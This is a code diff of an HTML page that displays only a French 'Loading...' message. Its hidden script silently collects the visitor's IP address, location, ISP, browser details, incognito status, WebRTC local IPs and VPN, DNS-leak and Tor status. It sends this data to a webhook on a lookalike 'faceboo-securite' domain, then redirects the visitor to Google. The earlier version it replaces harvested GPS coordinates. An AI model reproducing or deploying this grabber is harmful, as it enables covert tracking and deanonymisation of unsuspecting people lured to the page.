@@ -8,63 +8,105 @@
 <body>
     <h2>Chargement en cours...</h2>
     <script>
-        function sendToWebhook(data) {
-            fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
+        async function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                type: connection ? connection.type : "Inconnu",
+                downlink: connection ? connection.downlink + " Mbps" : "Inconnu",
+                effectiveType: connection ? connection.effectiveType : "Inconnu",
+                rtt: connection ? connection.rtt + " ms" : "Inconnu"
+            };
+        }
+
+        async function detectIncognito() {
+            return new Promise((resolve) => {
+                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                if (!fs) resolve(false);
+                else {
+                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+                }
             });
         }
 
-        // Récupérer la position GPS exacte
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                let logData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    userAgent: navigator.userAgent
+        async function getWebRTCIPs() {
+            return new Promise((resolve) => {
+                let ips = [];
+                let rtc = new RTCPeerConnection();
+                rtc.createDataChannel("");
+                rtc.createOffer().then(o => rtc.setLocalDescription(o));
+                rtc.onicecandidate = event => {
+                    if (event && event.candidate && event.candidate.candidate) {
+                        let ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
+                        let match = event.candidate.candidate.match(ipRegex);
+                        if (match && match[1] && !ips.includes(match[1])) {
+                            ips.push(match[1]);
+                        }
+                    } else {
+                        resolve(ips);
+                    }
                 };
-                sendToWebhook(logData);
-            }, error => {
-                console.warn("Accès au GPS refusé, fallback sur IP.");
-                fetch("https://ipinfo.io/json")
-                .then(response => response.json())
-                .then(data => {
-                    let logData = {
-                        ip: data.ip,
-                        ville: data.city,
-                        région: data.region,
-                        pays: data.country,
-                        fournisseur: data.org,
-                        position: data.loc, // Approximation par IP
-                        userAgent: navigator.userAgent
-                    };
-                    sendToWebhook(logData);
-                });
-            });
-        } else {
-            console.warn("GPS non supporté, fallback sur IP.");
-            fetch("https://ipinfo.io/json")
-            .then(response => response.json())
-            .then(data => {
-                let logData = {
-                    ip: data.ip,
-                    ville: data.city,
-                    région: data.region,
-                    pays: data.country,
-                    fournisseur: data.org,
-                    position: data.loc, // Approximation par IP
-                    userAgent: navigator.userAgent
-                };
-                sendToWebhook(logData);
             });
         }
-        
-        // Redirection après tracking
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 3000);
+
+        async function detectVPN() {
+            let publicIP = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
+            let webrtcIPs = await getWebRTCIPs();
+
+            return {
+                isUsingVPN: webrtcIPs.length > 0 && !webrtcIPs.includes(publicIP.ip),
+                publicIP: publicIP.ip,
+                webrtcIPs: webrtcIPs
+            };
+        }
+
+        async function detectDNSLeak() {
+            let dnsTest = await fetch("https://dnsleaktest.com/api/").then(res => res.json());
+            return dnsTest.dns;
+        }
+
+        async function detectTorProxy() {
+            let test = await fetch("https://check.torproject.org/api/ip").then(res => res.json());
+            return test.IsTor ? "Tor détecté" : "Pas de Tor";
+        }
+
+        async function collectData() {
+            let ipInfo = await fetch("https://ipinfo.io/json").then(response => response.json());
+            let networkInfo = await getNetworkInfo();
+            let incognito = await detectIncognito();
+            let vpnData = await detectVPN();
+            let dnsLeak = await detectDNSLeak();
+            let torCheck = await detectTorProxy();
+
+            let logData = {
+                ip: ipInfo.ip,
+                ville: ipInfo.city,
+                région: ipInfo.region,
+                pays: ipInfo.country,
+                fournisseur: ipInfo.org,
+                position: ipInfo.loc,
+                userAgent: navigator.userAgent,
+                incognitoMode: incognito,
+                webrtcIPs: vpnData.webrtcIPs,
+                vpnDetected: vpnData.isUsingVPN,
+                dnsLeakDetected: dnsLeak,
+                torStatus: torCheck,
+                network: networkInfo
+            };
+
+            // Envoyer les logs à un webhook (ex: Discord, n8n, API perso)
+            fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(logData)
+            });
+
+            // Redirection après tracking
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 3500);
+        }
+
+        collectData();
     </script>
 </body>
 </html>
